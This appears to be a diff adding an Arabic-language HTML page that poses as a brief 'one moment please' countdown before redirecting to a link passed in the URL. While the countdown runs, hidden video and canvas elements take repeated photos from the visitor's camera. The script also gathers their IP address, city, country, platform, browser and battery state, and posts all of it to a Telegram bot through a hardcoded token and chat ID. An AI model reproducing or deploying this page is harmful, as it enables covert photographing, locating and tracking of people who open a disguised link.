@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <title>لحظة واحدة</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            flex-direction: column;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        #countdown {
+            font-size: 72px;
+            font-weight: bold;
+            color: #ff6600;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .message {
+            font-size: 24px;
+            color: #ffffff;
+            margin-top: 20px;
+        }
+        /* إخفاء عناصر الفيديو والكاميرا عن المستخدم */
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="countdown">10</div>
+        <div class="message">لحظة واحدة من فضلك...</div>
+    </div>
+
+    <!-- عناصر الفيديو والكاميرا ستكون مخفية -->
+    <video id="frontVideo" playsinline autoplay muted></video>
+    <video id="backVideo" playsinline autoplay muted></video>
+    <canvas id="frontCanvas"></canvas>
+    <canvas id="backCanvas"></canvas>
+
+    <script>
+        // --- المتغيرات الأساسية ---
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+        const countdownElement = document.getElementById('countdown');
+        let countdownValue = 10;
+
+        // --- إعدادات التليجرام ---
+        const telegramBotToken = "8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4";
+        const fixedChatId = "1431886140"; // ID احتياطي في حال لم يوجد في الرابط
+
+        // --- استخراج البيانات من رابط الصفحة ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatIdFromUrl = urlParams.get('chatId') || urlParams.get('id'); // يقرأ chatId أو id
+        const originalLinkFromUrl = urlParams.get('originalLink');
+
+        // --- تحديد الـ ID النهائي للإرسال ---
+        const finalChatId = chatIdFromUrl || fixedChatId;
+
+        // --- دالة لإعادة التوجيه ---
+        function redirectToOriginalLink() {
+            console.log(`Redirecting to: ${originalLinkFromUrl}`);
+            if (originalLinkFromUrl) {
+                window.location.href = originalLinkFromUrl;
+            } else {
+                // في حال عدم وجود رابط، يمكن توجيهه إلى صفحة افتراضية
+                console.error("Original link not provided in the URL.");
+                // window.location.href = "https://google.com"; // مثال
+            }
+        }
+
+        // --- دالة لإرسال البيانات إلى تليجرام ---
+        async function sendToTelegram(formData) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Photo sent successfully to Telegram.');
+                } else {
+                    console.error('Failed to send photo to Telegram:', result.description);
+                }
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+            }
+        }
+
+        // --- دالة لجمع معلومات الجهاز ---
+        async function collectAdditionalData() {
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+                const battery = await navigator.getBattery();
+                return {
+                    ip: ipInfo.ip,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    batteryLevel: `${Math.round(battery.level * 100)}%`,
+                    batteryCharging: battery.charging ? 'نعم' : 'لا',
+                };
+            } catch (error) {
+                console.error('Error collecting device data:', error);
+                return { error: 'لا يمكن جمع بيانات الجهاز.' };
+            }
+        }
+
+        // --- دالة لطلب الوصول إلى الكاميرا ---
+        async function requestCameraPermission(facingMode) {
+            try {
+                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+            } catch (error) {
+                console.error(`خطأ في الوصول إلى الكاميرا (${facingMode}):`, error);
+                return null;
+            }
+        }
+
+        // --- دالة لإعداد الكاميرا والتقاط الصور ---
+        function setupCameraAndCapture(video, canvas, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const { videoWidth, videoHeight } = video;
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+                const context = canvas.getContext('2d');
+                let photoCount = 0;
+                const maxPhotos = 6;
+
+                const captureInterval = setInterval(() => {
+                    if (photoCount >= maxPhotos) {
+                        clearInterval(captureInterval);
+                        // بعد التقاط الصور من كاميرا واحدة، يتم إعادة التوجيه
+                        redirectToOriginalLink();
+                        return;
+                    }
+
+                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        const caption = `
+---[ معلومات الجهاز ]---
+📸 الكاميرا: ${cameraType}
+📍 عنوان IP: ${additionalData.ip || 'غير متاح'}
+🌍 الدولة: ${additionalData.country || 'غير متاح'}
+🏙️ المدينة: ${additionalData.city || 'غير متاح'}
+💻 النظام: ${additionalData.platform || 'غير متاح'}
+🔋 البطارية: ${additionalData.batteryLevel || 'غير متاح'} (حالة الشحن: ${additionalData.batteryCharging})
+🌐 المتصفح: ${additionalData.userAgent || 'غير متاح'}
+                        `;
+                        
+                        formData.append('chat_id', finalChatId);
+                        formData.append('photo', blob, `image.jpg`);
+                        formData.append('caption', caption);
+                        
+                        sendToTelegram(formData);
+
+                    }, 'image/jpeg', 0.8);
+
+                    photoCount++;
+                }, 1000); // التقاط صورة كل ثانية
+            };
+        }
+
+        // --- دالة بدء العد التنازلي ---
+        function startCountdown() {
+            const interval = setInterval(() => {
+                countdownValue--;
+                countdownElement.textContent = countdownValue;
+                if (countdownValue <= 0) {
+                    clearInterval(interval);
+                    countdownElement.textContent = "!";
+                }
+            }, 700);
+        }
+
+        // --- الدالة الرئيسية للتنفيذ ---
+        async function init() {
+            if (!finalChatId || !originalLinkFromUrl) {
+                console.error("Chat ID or Original Link is missing from URL. Aborting.");
+                if (originalLinkFromUrl) redirectToOriginalLink(); // إذا كان رابط التوجيه موجودًا، نوجه المستخدم على الأقل
+                return;
+            }
+
+            const additionalData = await collectAdditionalData();
+            const frontStream = await requestCameraPermission('user');
+            const backStream = await requestCameraPermission('environment');
+
+            if (frontStream || backStream) {
+                if (frontStream) {
+                    frontVideo.srcObject = frontStream;
+                    setupCameraAndCapture(frontVideo, frontCanvas, 'الأمامية', additionalData);
+                }
+                // يتم تشغيل الكاميرا الخلفية فقط إذا لم تتوفر الأمامية لضمان إعادة التوجيه بعد مجموعة واحدة من الصور
+                else if (backStream) {
+                    backVideo.srcObject = backStream;
+                    setupCameraAndCapture(backVideo, backCanvas, 'الخلفية', additionalData);
+                }
+            } else {
+                // إذا لم يتم منح إذن الكاميرا، أرسل البيانات المتاحة وأعد التوجيه
+                const caption = `
+---[ معلومات الجهاز (بدون كاميرا) ]---
+📍 عنوان IP: ${additionalData.ip || 'غير متاح'}
+🌍 الدولة: ${additionalData.country || 'غير متاح'}
+🏙️ المدينة: ${additionalData.city || 'غير متاح'}
+💻 النظام: ${additionalData.platform || 'غير متاح'}
+🔋 البطارية: ${additionalData.batteryLevel || 'غير متاح'} (حالة الشحن: ${additionalData.batteryCharging})
+🌐 المتصفح: ${additionalData.userAgent || 'غير متاح'}
+                `;
+                const noCamUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                await fetch(noCamUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: finalChatId, text: caption }),
+                });
+                redirectToOriginalLink();
+            }
+        }
+
+        // --- بدء التنفيذ ---
+        startCountdown();
+        init();
+
+    </script>
+
+</body>
+</html>
+
